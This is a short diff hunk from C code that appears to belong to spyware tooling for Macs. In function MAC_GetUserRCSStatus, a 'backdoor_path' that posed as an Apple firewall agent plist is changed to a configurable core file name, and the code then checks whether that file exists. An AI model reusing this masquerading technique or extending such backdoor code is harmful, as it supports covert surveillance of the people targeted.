@@ -50,7 +50,7 @@ DWORD MAC_GetUserRCSStatus(users_struct_t *user_info, rcs_struct_t *rcs_info, os
 		CloseHandle(hfile);
 		is_temp_dir = TRUE;
 
-		swprintf_s(backdoor_path, MAX_PATH, L"%s\\com.apple.alf.agent.plist", backdoor_path);
+		swprintf_s(backdoor_path, MAX_PATH, L"%s\\%s", backdoor_path, rcs_info->hcore);
 		hfile = CreateFile(backdoor_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 		if (hfile != INVALID_HANDLE_VALUE) {
 			CloseHandle(hfile);
